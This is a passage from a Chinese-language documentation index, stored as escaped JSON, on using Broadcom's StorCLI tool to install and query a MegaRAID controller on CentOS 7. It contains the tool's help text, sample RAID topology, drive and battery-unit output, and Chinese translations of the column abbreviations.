\u547d\u4ee4\u5728/opt/MegaRAID/storcli\u76ee\u5f55\u4e0b # pwd /opt/MegaRAID/storcli # ll total 7724 -rw-r--r-- 1 root root 0 Oct 8 18:34 install.log -rwxr--r-- 1 root root 7890144 Nov 2 2022 storcli64 -rw-r--r-- 1 root root 853 Oct 8 18:36 storcli.log \u5e2e\u52a9 [root@VM-0-16-centos storcli]# ./storcli64 StorCli SAS\u5b9a\u5236\u5b9e\u7528\u7a0b\u5e8f\u7248\u672c007.2310.0000.0000 2022\u5e7411\u67082\u65e5 \uff08c\uff09 \u7248\u6743\u6240\u67092022\uff0cBroadcom\u80a1\u4efd\u6709\u9650\u516c\u53f8\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 help - \u5217\u51fa\u4e86\u6240\u6709\u547d\u4ee4\u53ca\u5176\u7528\u6cd5\u3002 \u4f8b\u5982\uff1a storcli help <\u547d\u4ee4> help - \u63d0\u4f9b\u6709\u5173\u7279\u5b9a\u547d\u4ee4\u7684\u8be6\u7ec6\u4fe1\u606f. \u4f8b\u5982\uff1a storcli add help \u547d\u4ee4\u5217\u8868\uff1a \u547d\u4ee4 \u63cf\u8ff0 ------------------------------------------------------------------- add \u5411\u63a7\u5236\u5668\u6dfb\u52a0/\u521b\u5efa\u4e00\u4e2a\u65b0\u5143\u7d20\uff0c\u5982VD\u3001Spare\u3002\u3002\u7b49 delete \u5220\u9664VD\u3001Spare\u7b49\u5143\u7d20 show \u663e\u793a\u6709\u5173\u5143\u4fe1\u606f set \u4e3a\u5c5e\u6027\u8bbe\u7f6e\u7279\u5b9a\u503c get \u4e3a\u5c5e\u6027\u83b7\u53d6\u7279\u5b9a\u503c compare \u5c06\u7279\u5b9a\u503c\u4e0e\u5c5e\u6027\u8fdb\u884c\u6bd4\u8f83 start \u542f\u52a8\u540e\u53f0\u64cd\u4f5c stop \u505c\u6b62\u540e\u53f0\u64cd\u4f5c pause \u6682\u505c\u540e\u53f0\u64cd\u4f5c resume \u6062\u590d\u540e\u53f0\u64cd\u4f5c download \u5c06\u6587\u4ef6\u4e0b\u8f7d\u5230\u7ed9\u5b9a\u8bbe\u5907 expand \u6269\u5c55\u7ed9\u5b9a\u9a71\u52a8\u5668\u7684\u5927\u5c0f insert \u63d2\u5165\u4e22\u5931\u7684\u65b0\u9a71\u52a8\u5668 transform \u964d\u4f4e\u63a7\u5236\u5668\u7684\u7ea7\u522b reset \u91cd\u7f6e\u63a7\u5236\u5668phy split \u62c6\u5206\u903b\u8f91\u9a71\u52a8\u5668\u955c\u50cf /cx \u63a7\u5236\u5668\u7279\u5b9a\u547d\u4ee4 /ex \u673a\u67dc\u7279\u5b9a\u547d\u4ee4 /sx \u63d2\u69fd/PD\u7279\u5b9a\u547d\u4ee4 /vx \u865a\u62df\u9a71\u52a8\u5668\u7279\u5b9a\u547d\u4ee4 /dx \u78c1\u76d8\u7ec4\u7279\u5b9a\u547d\u4ee4 /fall \u5916\u90e8\u914d\u7f6e\u7279\u5b9a\u547d\u4ee4 /px Phy\u7279\u5b9a\u547d\u4ee4 /lnx Lane\u7279\u5b9a\u547d\u4ee4 /[bbu|cv] \u5907\u7528\u7535\u6c60\u5355\u5143\uff0cCachevault\u547d\u4ee4 Other aliases : cachecade, freespace, sysinfo \u4f7f\u7528\u547d\u4ee4\u7ec4\u5408\u53ef\u4ee5\u8fdb\u4e00\u6b65\u7b5b\u9009\u5e2e\u52a9\u7684\u8f93\u51fa\u3002 \u4f8b\u5982. 'storcli cx show help' \u663e\u793acx\u4e0a\u7684\u6240\u6709\u663e\u793a\u64cd\u4f5c\u3002 \u4f7f\u7528verbose\u8fdb\u884c\u8be6\u7ec6\u63cf\u8ff0 \u4f8b\u5982. 'storcli add verbose help' \u4f7f\u7528\u201cpage[=x]\u201d\u4f5c\u4e3a\u6240\u6709\u547d\u4ee4\u4e2d\u8bbe\u7f6e\u5206\u9875\u7b26\u7684\u6700\u540e\u4e00\u4e2a\u9009\u9879\u3002 X=\u6bcf\u9875\u884c\u6570\u3002 \u4f8b\u5982. 'storcli help page=10' \u4f7f\u7528J\u4f5c\u4e3a\u6700\u540e\u4e00\u4e2a\u9009\u9879\uff0c\u4ee5JSON\u683c\u5f0f\u6253\u5370\u547d\u4ee4\u8f93\u51fa \u547d\u4ee4\u9009\u9879\u7684\u8f93\u5165\u987a\u5e8f\u5fc5\u987b\u4e0e\u76f8\u5e94\u547d\u4ee4\u5e2e\u52a9\u4e2d\u663e\u793a\u7684\u987a\u5e8f\u76f8\u540c\u3002 \u4f7f\u7528\u201cnolog\u201d\u9009\u9879\u7981\u7528\u8c03\u8bd5\u65e5\u5fd7\u8bb0\u5f55. \u4f8b\u5982. 'storcli show nolog' \u663e\u793araid\u4fe1\u606f \u4f8b\u5982\uff1a #storcli64 /c0 show Controller = 0 #\u51e0\u53f7\u63a7\u5236\u5668 Status = Success #\u72b6\u6001\u6210\u529f Description = None #\u63cf\u8ff0\u65e0 Product Name = AVAGO MegaRAID SAS 9361-8i #\u4ea7\u54c1\u578b\u53f7 Serial Number = SK01467706 #sn\u53f7 SAS Address = 500605b01018f980 #SAS\u5730\u5740 Mfg. Date = 04/02/20 #\u5236\u9020\u65e5\u671f System Time = 10/13/2023 11:24:04 #\u7cfb\u7edf\u65f6\u95f4 Controller Time = 10/13/2023 11:21:19 #\u63a7\u5236\u5668\u65f6\u95f4 FW Package Build = 24.21.0-0132 #FW\u5305\u6784\u5efa\u53f7 BIOS Version = 6.36.00.3_4.19.08.00_0x06180203 #bios\u7248\u672c FW Version = 4.680.00-8527 #FW\u7248\u672c Driver Name = megaraid_sas # \u9a71\u52a8\u540d\u5b57 Driver Version = 07.710.06.00 # \u9a71\u52a8\u7248\u672c Controller Bus Type = N/A # \u63a7\u5236\u5668\u603b\u7ebf\u7c7b\u578b PCI Slot = N/A # \u63d2\u69fd PCI Bus Number = 24 # PCI\u603b\u7ebf\u53f7 PCI Device Number = 0 # PCI\u8bbe\u5907\u7f16\u53f7 PCI Function Number = 0 # PCI\u529f\u80fd\u7f16\u53f7 Drive Groups = 2 # \u9a71\u52a8\u5668\u7ec4 TOPOLOGY : # \u62d3\u6251\u7ed3\u6784 ======== -------------------------------------------------------------------------- DG Arr Row EID:Slot DID Type State BT Size PDC PI SED DS3 FSpace -------------------------------------------------------------------------- 0 - - - - RAID5 Optl N 1.635 TB dsbl N N dflt N 0 0 - - - RAID5 Optl N 1.635 TB dsbl N N dflt N 0 0 0 8:0 20 DRIVE Onln N 558.406 GB dsbl N N dflt - 0 0 1 8:1 11 DRIVE Onln N 558.406 GB dsbl N N dflt - 0 0 2 8:2 15 DRIVE Onln N 558.406 GB dsbl N N dflt - 0 0 3 8:3 19 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 - - - - RAID5 Optl N 3.816 TB dsbl N N dflt N 1 0 - - - RAID5 Optl N 3.816 TB dsbl N N dflt N 1 0 0 8:4 12 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 0 1 8:5 17 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 0 2 8:6 16 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 0 3 8:7 9 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 0 4 8:8 10 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 0 5 8:9 14 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 0 6 8:10 13 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 0 7 8:11 18 DRIVE Onln N 558.406 GB dsbl N N dflt - -------------------------------------------------------------------------- DG=Disk Group Index|Arr=Array Index|Row=Row Index|EID=Enclosure Device ID DID=Device ID|Type=Drive Type|Onln=Online|Rbld=Rebuild|Dgrd=Degraded Pdgd=Partially degraded|Offln=Offline|BT=Background Task Active PDC=PD Cache|PI=Protection Info|SED=Self Encrypting Drive|Frgn=Foreign DS3=Dimmer Switch 3|dflt=Default|Msng=Missing|FSpace=Free Space Present ###################################\u7ffb\u8bd1##################################### -------------------------------------------------------------------------- \u78c1\u76d8\u7ec4\u7d22\u5f15 \u9635\u5217\u7d22\u5f15 \u884c\u7d22\u5f15 \u8bbe\u5907\u67dc\u8bbe\u5907ID:\u63d2\u69fd \u8bbe\u5907ID \u9a71\u52a8\u5668\u7c7b\u578b \u72b6\u6001 \u540e\u53f0\u4efb\u52a1\u6d3b\u52a8 \u5927\u5c0f \u4fdd\u62a4\u6570\u636e\u7f13\u5b58 \u4fdd\u62a4\u4fe1\u606f \u81ea\u52a0\u5bc6\u786c\u76d8 \u8c03\u5149\u5f00\u5173 \u7a7a\u95f2\u7a7a\u95f4\u5b58\u5728 -------------------------------------------------------------------------- 0 - - - - RAID5 \u6700\u4f73 N 1.635 TB \u7981\u7528 N N \u9ed8\u8ba4 N 0 0 - - - RAID5 \u6700\u4f73 N 1.635 TB \u7981\u7528 N N \u9ed8\u8ba4 N 0 0 0 8:0 20 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 0 0 1 8:1 11 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 0 0 2 8:2 15 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 0 0 3 8:3 19 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 - - - - RAID5 \u6700\u4f73 N 3.816 TB \u7981\u7528 N N \u9ed8\u8ba4 N 1 0 - - - RAID5 \u6700\u4f73 N 3.816 TB \u7981\u7528 N N \u9ed8\u8ba4 N 1 0 0 8:4 12 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 0 1 8:5 17 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 0 2 8:6 16 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 0 3 8:7 9 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 0 4 8:8 10 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 0 5 8:9 14 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 0 6 8:10 13 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 0 7 8:11 18 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - -------------------------------------------------------------------------- DG = \u78c1\u76d8\u7ec4\u7d22\u5f15 Arr = \u9635\u5217\u7d22\u5f15 Row = \u884c\u7d22\u5f15 EID = \u8bbe\u5907\u67dc\u8bbe\u5907ID DID = \u8bbe\u5907ID Type = \u9a71\u52a8\u5668\u7c7b\u578b Onln = \u5728\u7ebf Rbld = \u91cd\u5efa Dgrd = \u964d\u7ea7 Pdgd = \u90e8\u5206\u964d\u7ea7 Offln = \u79bb\u7ebf BT = \u540e\u53f0\u4efb\u52a1\u6d3b\u52a8 PDC = \u4fdd\u62a4\u6570\u636e\u7f13\u5b58 PI = \u4fdd\u62a4\u4fe1\u606f SED = \u81ea\u52a0\u5bc6\u786c\u76d8 Frgn = \u5916\u90e8 DS3 = \u8c03\u5149\u5f00\u5173 3 dflt = \u9ed8\u8ba4 Msng = \u7f3a\u5931 FSpace = \u7a7a\u95f2\u7a7a\u95f4\u5b58\u5728 ###################################\u7ffb\u8bd1##################################### Virtual Drives = 2 VD LIST : # VD\u5217\u8868 ======= ------------------------------------------------------------ DG/VD TYPE State Access Consist Cache sCC Size Name ------------------------------------------------------------ 0/0 RAID5 Optl RW Yes RWBD - 1.635 TB RaidGP1 1/1 RAID5 Optl RW Yes RWBD - 3.816 TB RaidGP2 ------------------------------------------------------------ Cac=CacheCade|Rec=Recovery|OfLn=OffLine|Pdgd=Partially Degraded|dgrd=Degraded Optl=Optimal|RO=Read Only|RW=Read Write|B=Blocked|Consist=Consistent| Ra=Read Ahead Adaptive|R=Read Ahead Always|NR=No Read Ahead|WB=WriteBack| AWB=Always WriteBack|WT=WriteThrough|C=Cached IO|D=Direct IO|sCC=Scheduled Check Consistency ###################################\u7ffb\u8bd1##################################### ------------------------------------------------------------ \u78c1\u76d8\u7ec4/\u865a\u62df\u78c1\u76d8\u7c7b\u578b \u72b6\u6001 \u8bbf\u95ee \u4e00\u81f4\u6027 \u7f13\u5b58 \u8ba1\u5212\u68c0\u67e5\u4e00\u81f4\u6027 \u5927\u5c0f \u540d\u79f0 ------------------------------------------------------------ 0/0 RAID5 \u6700\u4f73 \u8bfb\u5199 \u662f \u8bfb\u5199\u7f13\u5b58 - 1.635 TB RaidGP1 1/1 RAID5 \u6700\u4f73 \u8bfb\u5199 \u662f \u8bfb\u5199\u7f13\u5b58 - 3.816 TB RaidGP2 ------------------------------------------------------------ Cac = \u7f13\u5b58 Rec = \u6062\u590d OfLn = \u79bb\u7ebf Pdgd = \u90e8\u5206\u964d\u7ea7 dgrd = \u964d\u7ea7 Optl = \u6700\u4f73 RO = \u53ea\u8bfb RW = \u8bfb\u5199 B = \u963b\u6b62 Consist = \u4e00\u81f4 Ra = \u81ea\u9002\u5e94\u9884\u8bfb R = \u603b\u662f\u9884\u8bfb NR = \u4e0d\u9884\u8bfb WB = \u5199\u56de AWB = \u603b\u662f\u5199\u56de WT = \u76f4\u5199 C = \u7f13\u5b58IO D = \u76f4\u63a5IO sCC = \u8ba1\u5212\u68c0\u67e5\u4e00\u81f4\u6027 ###################################\u7ffb\u8bd1##################################### Physical Drives = 12 PD LIST : ======= ------------------------------------------------------------------------- EID:Slt DID State DG Size Intf Med SED PI SeSz Model Sp ------------------------------------------------------------------------- 8:0 20 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:1 11 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:2 15 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:3 19 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:4 12 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:5 17 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:6 16 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:7 9 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:8 10 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:9 14 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:10 13 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:11 18 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U ------------------------------------------------------------------------- EID-Enclosure Device ID|Slt-Slot No.|DID-Device ID|DG-DriveGroup DHS-Dedicated Hot Spare|UGood-Unconfigured Good|GHS-Global Hotspare UBad-Unconfigured Bad|Onln-Online|Offln-Offline|Intf-Interface Med-Media Type|SED-Self Encryptive Drive|PI-Protection Info SeSz-Sector Size|Sp-Spun|U-Up|D-Down|T-Transition|F-Foreign ###################################\u7ffb\u8bd1##################################### ------------------------------------------------------------------------- EID: \u8bbe\u5907\u67dc\u6807\u8bc6\u53f7 | Slt: \u63d2\u69fd\u7f16\u53f7 | DID: \u8bbe\u5907\u6807\u8bc6\u53f7 | State: \u72b6\u6001 | DG: \u9a71\u52a8\u7ec4 Size: \u5927\u5c0f | Intf: \u63a5\u53e3 | Med: \u5a92\u4f53\u7c7b\u578b | SED: \u81ea\u52a0\u5bc6\u9a71\u52a8 | PI: \u4fdd\u62a4\u4fe1\u606f | SeSz: \u6247\u533a\u5927\u5c0f Model: \u578b\u53f7 | Sp: \u78c1\u76d8\u9a71\u52a8\u5668\u65cb\u8f6c\u72b6\u6001 ------------------------------------------------------------------------- 8:0 20 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:1 11 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:2 15 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:3 19 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:4 12 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:5 17 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:6 16 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:7 9 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:8 10 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:9 14 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:10 13 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:11 18 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U ------------------------------------------------------------------------- - EID: \u8bbe\u5907\u67dc\u6807\u8bc6\u53f7 - Slt: \u63d2\u69fd\u7f16\u53f7 - DID: \u8bbe\u5907\u6807\u8bc6\u53f7 - DG: \u9a71\u52a8\u7ec4 - DHS: \u4e13\u7528\u70ed\u5907 - UGood: \u672a\u914d\u7f6e\u597d - GHS: \u5168\u5c40\u70ed\u5907 - UBad: \u672a\u914d\u7f6e\u4e0d\u4f73 - Onln: \u5728\u7ebf - Offln: \u79bb\u7ebf - Intf: \u63a5\u53e3 - Med: \u5a92\u4f53\u7c7b\u578b - SED: \u81ea\u52a0\u5bc6\u9a71\u52a8 - PI: \u4fdd\u62a4\u4fe1\u606f - SeSz: \u6247\u533a\u5927\u5c0f - Sp: \u65cb\u8f6c\u4e2d - U: \u542f\u52a8 - D: \u505c\u7528 - T: \u72b6\u6001\u8f6c\u6362 - F: \u5916\u90e8\u7684 ###################################\u7ffb\u8bd1##################################### BBU_Info : ======== ----------------------------------------------------------------------- Model State RetentionTime Temp Mode MfgDate Next Learn ----------------------------------------------------------------------- CVPM02 Optimal 0 hour(s) 26C 0 2019/11/02 2023/10/17 09:23:25 ----------------------------------------------------------------------- ###################################\u7ffb\u8bd1##################################### BBU\u4fe1\u606f\uff1a ======== ----------------------------------------------------------------------- \u578b\u53f7 \u72b6\u6001 \u4fdd\u6301\u65f6\u95f4 \u6e29\u5ea6 \u6a21\u5f0f \u5236\u9020\u65e5\u671f \u4e0b\u6b21\u5b66\u4e60 ----------------------------------------------------------------------- CVPM02 \u6b63\u5e38 0 \u5c0f\u65f6 26\u6444\u6c0f\u5ea6 0 2019/11/02 2023/10/17 09:23:25 ----------------------------------------------------------------------- \"\u4fdd\u6301\u65f6\u95f4\"\uff08RetentionTime\uff09\u901a\u5e38\u662f\u6307\u7535\u6c60\u5907\u4efd\u5355\u5143\uff08BBU\uff09\u80fd\u591f\u5728\u65ad\u7535\u6216\u6545\u969c\u60c5\u51b5\u4e0b\u4fdd\u6301\u5176\u5145\u7535\u72b6\u6001\uff0c\u4ee5\u7ee7\u7eed\u63d0\u4f9b\u7535\u6e90\u652f\u6301\u7684\u65f6\u95f4\u3002\u5b83\u8868\u793a\u5728\u65ad\u7535\u60c5\u51b5\u4e0b\uff0cBBU\u53ef\u4ee5\u4fdd\u6301\u5145\u7535\u72b6\u6001\u5e76\u7ee7\u7eed\u4f9b\u7535\u7684\u65f6\u95f4\u957f\u5ea6\u3002\u5728\u63d0\u4f9b\u7535\u6e90\u652f\u6301\u7684\u60c5\u51b5\u4e0b\uff0c\u6570\u636e\u53ef\u4ee5\u88ab\u4fdd\u5b58\u6216\u5b8c\u6210\u5199\u5165\u78c1\u76d8\uff0c\u4ee5\u907f\u514d\u6570\u636e\u4e22\u5931\u6216\u635f\u574f\u3002 \"\u4fdd\u6301\u65f6\u95f4\"\u7684\u503c\u662f \"0 \u5c0f\u65f6\"\uff0c\u8fd9\u8868\u793a\u7535\u6c60\u5907\u4efd\u5355\u5143\u76ee\u524d\u6ca1\u6709\u4fdd\u6301\u65f6\u95f4\uff0c\u5373\u5b83\u53ef\u80fd\u65e0\u6cd5\u5728\u65ad\u7535\u60c5\u51b5\u4e0b\u63d0\u4f9b\u7535\u6e90\u652f\u6301\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cBBU\u5e94\u8be5\u5177\u6709\u975e\u96f6\u7684\u4fdd\u6301\u65f6\u95f4\u4ee5\u63d0\u4f9b\u6570\u636e\u4fdd\u62a4\u3002 \"\u6a21\u5f0f\"\uff08Mode\uff09\u662f\u63cf\u8ff0\u7535\u6c60\u5907\u4efd\u5355\u5143\uff08BBU\uff09\u7684\u5de5\u4f5c\u6a21\u5f0f\u7684\u4fe1\u606f\u3002\u4e0d\u540c\u7684\u5de5\u4f5c\u6a21\u5f0f\u53ef\u80fd\u4f1a\u5f71\u54cd\u7535\u6c60\u7684\u884c\u4e3a\u548c\u6027\u80fd\u3002 \"\u6a21\u5f0f\"\u7684\u503c\u662f \"0\"\uff0c\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u4e0d\u540c\u7684\u6570\u5b57\u4ee3\u8868\u4e0d\u540c\u7684\u5de5\u4f5c\u6a21\u5f0f\u3002\u5177\u4f53\u7684\u6a21\u5f0f\u542b\u4e49\u53ef\u80fd\u56e0\u5236\u9020\u5546\u548c\u8bbe\u5907\u800c\u5f02\uff0c\u901a\u5e38\u6a21\u5f0f 0 \u8868\u793a\u6b63\u5e38\u8fd0\u884c\u6216\u4f18\u5316\u6a21\u5f0f\u3002\u4e0d\u540c\u7684\u6a21\u5f0f\u53ef\u4ee5\u5bf9\u7535\u6c60\u5145\u7535\u3001\u653e\u7535\u548c\u5907\u4efd\u64cd\u4f5c\u4ea7\u751f\u5f71\u54cd\uff0c\u56e0\u6b64\u4e86\u89e3\u7535\u6c60\u5907\u4efd\u5355\u5143\u7684\u6a21\u5f0f\u5bf9\u4e8e\u7ef4\u62a4\u548c\u76d1\u63a7\u7535\u6e90\u652f\u6301\u975e\u5e38\u91cd\u8981\u3002 ###################################\u7ffb\u8bd1##################################### \u4e0a\u6587\u4e2d\u63d0\u5230\u7684\u4f8b\u5b50\uff0c\u5728\u5e26\u5916\u7cfb\u7edf\u4e5f\u53ef\u4ee5\u67e5\u8be2\u5230\uff1a \u8981\u4f7f\u7528 storcli64 \u547d\u4ee4\u6765\u67e5\u770b\u6240\u6709\u78c1\u76d8\u7684\u72b6\u6001\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a storcli64 /c0 /eall /sall show \u8fd9\u91cc\u7684\u53c2\u6570\u89e3\u91ca\u5982\u4e0b\uff1a storcli64 \uff1a\u8fd9\u662f\u547d\u4ee4\u884c\u5de5\u5177\u7684\u540d\u79f0\u3002 /c0 \uff1a\u8868\u793a\u63a7\u5236\u5668\u7f16\u53f7\uff0c0\u662f\u7b2c\u4e00\u4e2a\u63a7\u5236\u5668\u3002\u5982\u679c\u4f60\u6709\u591a\u4e2a\u63a7\u5236\u5668\uff0c\u53ef\u80fd\u9700\u8981\u6539\u53d8\u8fd9\u4e2a\u6570\u5b57\u3002 /eall \uff1a\u8868\u793a\u6240\u6709\u7684\u673a\u7bb1\uff08enclosure\uff09\uff0c\u5982\u679c\u4f60\u6709\u591a\u4e2a\u673a\u7bb1\uff0c\u8fd9\u4f1a\u663e\u793a\u6240\u6709\u673a\u7bb1\u7684\u4fe1\u606f\u3002 /sall \uff1a\u8868\u793a\u6240\u6709\u7684\u69fd\u4f4d\uff08slot\uff09\uff0c\u5373\u663e\u793a\u6240\u6709\u78c1\u76d8\u69fd\u4f4d\u7684\u4fe1\u606f\u3002 show \uff1a\u8fd9\u4e2a\u53c2\u6570\u6307\u793astorcli\u663e\u793a\u4fe1\u606f\u3002 \u8fd0\u884c\u6b64\u547d\u4ee4\u540e\uff0c\u4f60\u5c06\u83b7\u5f97\u4e00\u4e2a\u5305\u542b\u6240\u6709\u78c1\u76d8\u72b6\u6001\u7684\u5217\u8868\uff0c\u5176\u4e2d\u5305\u62ec\u6bcf\u4e2a\u78c1\u76d8\u7684\u72b6\u6001\u3001\u5927\u5c0f\u3001\u7c7b\u578b\u7b49\u4fe1\u606f\u3002","title":"\u67e5\u8be2raid\u5361\u4fe1\u606f-storcli\u547d\u4ee4"},{"location":"system/centos7/storcli/#storcli","text":"\u4e0b\u8f7d \u8d85\u7ea7\u7a81\u88ad 9560-8i (broadcom.com) \u70b9\u51fb\u9875\u9762\u4e0a storcli Latest StorCLI \u5b89\u88c5 \u5b89\u88c5\u5305\u89e3\u538b\u540e rpm\u5b89\u88c5\u5305\u5728\u5982\u4e0b\u76ee\u5f55\uff1a storcli_rel/Unified_storcli_all_os/Linux rpm -ivh \u5b89\u88c5\u540e \u547d\u4ee4\u5728/opt/MegaRAID/storcli\u76ee\u5f55\u4e0b # pwd /opt/MegaRAID/storcli # ll total 7724 -rw-r--r-- 1 root root 0 Oct 8 18:34 install.log -rwxr--r-- 1 root root 7890144 Nov 2 2022 storcli64 -rw-r--r-- 1 root root 853 Oct 8 18:36 storcli.log","title":"StorCLI\u547d\u4ee4"},{"location":"system/centos7/storcli/#_1","text":"[root@VM-0-16-centos storcli]# ./storcli64 StorCli SAS\u5b9a\u5236\u5b9e\u7528\u7a0b\u5e8f\u7248\u672c007.2310.0000.0000 2022\u5e7411\u67082\u65e5 \uff08c\uff09 \u7248\u6743\u6240\u67092022\uff0cBroadcom\u80a1\u4efd\u6709\u9650\u516c\u53f8\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 help - \u5217\u51fa\u4e86\u6240\u6709\u547d\u4ee4\u53ca\u5176\u7528\u6cd5\u3002 \u4f8b\u5982\uff1a storcli help <\u547d\u4ee4> help - \u63d0\u4f9b\u6709\u5173\u7279\u5b9a\u547d\u4ee4\u7684\u8be6\u7ec6\u4fe1\u606f. \u4f8b\u5982\uff1a storcli add help \u547d\u4ee4\u5217\u8868\uff1a \u547d\u4ee4 \u63cf\u8ff0 ------------------------------------------------------------------- add \u5411\u63a7\u5236\u5668\u6dfb\u52a0/\u521b\u5efa\u4e00\u4e2a\u65b0\u5143\u7d20\uff0c\u5982VD\u3001Spare\u3002\u3002\u7b49 delete \u5220\u9664VD\u3001Spare\u7b49\u5143\u7d20 show \u663e\u793a\u6709\u5173\u5143\u4fe1\u606f set \u4e3a\u5c5e\u6027\u8bbe\u7f6e\u7279\u5b9a\u503c get \u4e3a\u5c5e\u6027\u83b7\u53d6\u7279\u5b9a\u503c compare \u5c06\u7279\u5b9a\u503c\u4e0e\u5c5e\u6027\u8fdb\u884c\u6bd4\u8f83 start \u542f\u52a8\u540e\u53f0\u64cd\u4f5c stop \u505c\u6b62\u540e\u53f0\u64cd\u4f5c pause \u6682\u505c\u540e\u53f0\u64cd\u4f5c resume \u6062\u590d\u540e\u53f0\u64cd\u4f5c download \u5c06\u6587\u4ef6\u4e0b\u8f7d\u5230\u7ed9\u5b9a\u8bbe\u5907 expand \u6269\u5c55\u7ed9\u5b9a\u9a71\u52a8\u5668\u7684\u5927\u5c0f insert \u63d2\u5165\u4e22\u5931\u7684\u65b0\u9a71\u52a8\u5668 transform \u964d\u4f4e\u63a7\u5236\u5668\u7684\u7ea7\u522b reset \u91cd\u7f6e\u63a7\u5236\u5668phy split \u62c6\u5206\u903b\u8f91\u9a71\u52a8\u5668\u955c\u50cf /cx \u63a7\u5236\u5668\u7279\u5b9a\u547d\u4ee4 /ex \u673a\u67dc\u7279\u5b9a\u547d\u4ee4 /sx \u63d2\u69fd/PD\u7279\u5b9a\u547d\u4ee4 /vx \u865a\u62df\u9a71\u52a8\u5668\u7279\u5b9a\u547d\u4ee4 /dx \u78c1\u76d8\u7ec4\u7279\u5b9a\u547d\u4ee4 /fall \u5916\u90e8\u914d\u7f6e\u7279\u5b9a\u547d\u4ee4 /px Phy\u7279\u5b9a\u547d\u4ee4 /lnx Lane\u7279\u5b9a\u547d\u4ee4 /[bbu|cv] \u5907\u7528\u7535\u6c60\u5355\u5143\uff0cCachevault\u547d\u4ee4 Other aliases : cachecade, freespace, sysinfo \u4f7f\u7528\u547d\u4ee4\u7ec4\u5408\u53ef\u4ee5\u8fdb\u4e00\u6b65\u7b5b\u9009\u5e2e\u52a9\u7684\u8f93\u51fa\u3002 \u4f8b\u5982. 'storcli cx show help' \u663e\u793acx\u4e0a\u7684\u6240\u6709\u663e\u793a\u64cd\u4f5c\u3002 \u4f7f\u7528verbose\u8fdb\u884c\u8be6\u7ec6\u63cf\u8ff0 \u4f8b\u5982. 'storcli add verbose help' \u4f7f\u7528\u201cpage[=x]\u201d\u4f5c\u4e3a\u6240\u6709\u547d\u4ee4\u4e2d\u8bbe\u7f6e\u5206\u9875\u7b26\u7684\u6700\u540e\u4e00\u4e2a\u9009\u9879\u3002 X=\u6bcf\u9875\u884c\u6570\u3002 \u4f8b\u5982. 'storcli help page=10' \u4f7f\u7528J\u4f5c\u4e3a\u6700\u540e\u4e00\u4e2a\u9009\u9879\uff0c\u4ee5JSON\u683c\u5f0f\u6253\u5370\u547d\u4ee4\u8f93\u51fa \u547d\u4ee4\u9009\u9879\u7684\u8f93\u5165\u987a\u5e8f\u5fc5\u987b\u4e0e\u76f8\u5e94\u547d\u4ee4\u5e2e\u52a9\u4e2d\u663e\u793a\u7684\u987a\u5e8f\u76f8\u540c\u3002 \u4f7f\u7528\u201cnolog\u201d\u9009\u9879\u7981\u7528\u8c03\u8bd5\u65e5\u5fd7\u8bb0\u5f55. \u4f8b\u5982. 'storcli show 